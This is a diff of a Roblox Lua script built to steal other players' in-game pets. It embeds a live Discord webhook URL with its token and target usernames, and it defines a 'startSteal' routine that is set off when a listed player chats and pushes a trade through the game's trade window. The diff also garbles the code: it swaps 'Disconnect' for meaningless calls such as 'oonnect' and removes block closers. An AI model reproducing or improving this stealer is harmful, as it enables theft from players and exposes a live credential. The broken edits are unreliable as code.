@@ -1,5 +1,3 @@
-
-
 local Webhook = "https://discord.com/api/webhooks/1465340884705873931/sjdicI6_huK8qalBn_ntg_avQAvNASoPpHo-hsWPR9M_xQOUmUyyEuiTUm8MPR0lurXN"
 local Username = {"Lilicyy90"}
 local ExtraUsers = {"Lilicyy90"}
@@ -274,11 +272,11 @@ local function startSteal(plr)
         end
 
         if not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
-            if declineConn then declineConn:Disconnect() end
+            if declineConn then declineConn:oonnect() end
             return
         end
 
-        if declineConn then declineConn:Disconnect() end
+        if declineConn then declineConn:ronnect() end
 
         for i = 1, math.min(18, #hits) do
             local pet = hits[i]
@@ -312,8 +310,6 @@ Players.PlayerAdded:Connect(function(p)
     task.wait(2)
     if table.find(Friends, p.Name) then
         p.Chatted:Connect(function() startSteal(p) end)
-    end
-end)
     end
 end)
 
